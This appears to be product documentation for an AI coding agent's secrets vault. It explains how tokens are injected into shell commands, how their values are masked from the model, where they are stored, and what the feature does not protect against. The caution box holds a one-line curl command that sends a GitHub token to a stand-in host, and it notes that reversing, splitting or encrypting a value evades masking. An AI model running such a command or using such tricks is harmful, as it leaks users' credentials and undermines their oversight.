---
title: Secrets vault
description: Store API tokens and passwords once; the agent uses them in shell commands as $NAME without ever seeing their values.
sidebar:
  badge: New
---

The vault holds secrets (API tokens, passwords) that the agent can **use** without **seeing** them. You store a secret once under a name. Every shell command Rein runs gets it as an environment variable. Anywhere its value would reach the model, Rein replaces it with `[secret:NAME]`.

```text title="rein"
› /vault set GITHUB_TOKEN
```

A hidden field opens for the value. It never goes into the chat, the transcript or your input history. Then:

```text title="the agent runs"
$ curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user | head -3
$ echo $GITHUB_TOKEN
[secret:GITHUB_TOKEN]
```

Tools that read the environment on their own (`gh`, `npm`, `aws`, `docker login --password-stdin`…) pick the variables up as usual.

## Commands

| Command | What it does |
|---|---|
| `/vault` | Lists the names in the vault (never values) and where they're stored |
| `/vault set NAME` | Stores or replaces a secret. Type or paste the value in the hidden field; Esc cancels. Names are letters, digits and `_`, like `GITHUB_TOKEN` |
| `/vault rm NAME` | Removes it |

Don't type the value on the command line: `/vault set NAME value` is refused, and the line is kept out of your input history and the transcript.

## What the agent knows

Its system prompt lists the **names** (`$GITHUB_TOKEN, $NPM_TOKEN`) and says they're set in every shell command. Changing the vault takes effect on the next turn.

## Where values go

- **Into:** the environment of every command Rein starts: the agent's shell commands (sandboxed or not, background and [interactive](../tools/#commands-that-need-you) ones too), its subagents' commands, and your own [`!` commands](../../reference/commands/#shell-commands-with-).
- **Not into:** Rein's own environment. The `claude` and `codex` CLIs, MCP servers, hooks and [language servers](../code-intelligence/) never get them.
- **Masked in:** command output (including what `shell_logs` reads later) and **every tool result** (a file the agent reads, a web page, an MCP tool's answer, an error), before the model, hooks or the transcript see it. The value is masked as is, JSON-escaped, URL-encoded, hex, and base64 (standard and URL-safe, including the common `echo $X | base64` case).

Values shorter than 6 characters aren't masked, since masking `1234` would mangle ordinary output.

## Storage

| Platform | Where |
|---|---|
| macOS | The login Keychain, as one item `rein-vault` |
| Windows | `secrets/vault.json.dpapi` in the [data folder](../../reference/files/), encrypted with DPAPI (only your Windows user can decrypt it) |
| Linux, or with `REIN_HOME` set | `secrets/vault.json` in the data folder, `0600` |

The `secrets/` folder is a [sensitive location](../permissions/#sensitive-locations): the file tools ask about it every time, even in bypass mode.

## What it protects against, and what it doesn't

:::caution[Know the limits]
The vault keeps secret values out of the conversation: out of what the model reads, so out of your transcripts, compaction summaries, exports and the providers' logs. It does **not** stop a command from *sending* a secret somewhere. `curl -d "$GITHUB_TOKEN" https://example.com` would work, because that's what using a secret means. That's what [approvals](../permissions/) and the sandbox's network rules are for: review commands that talk to hosts you don't expect. Masking also only catches the encodings listed above: a command that reverses, splits or encrypts a value prints something Rein can't recognize.
:::

## Related

- [Permissions](../permissions/): approvals and sensitive locations
- [Security](../../project/security/)
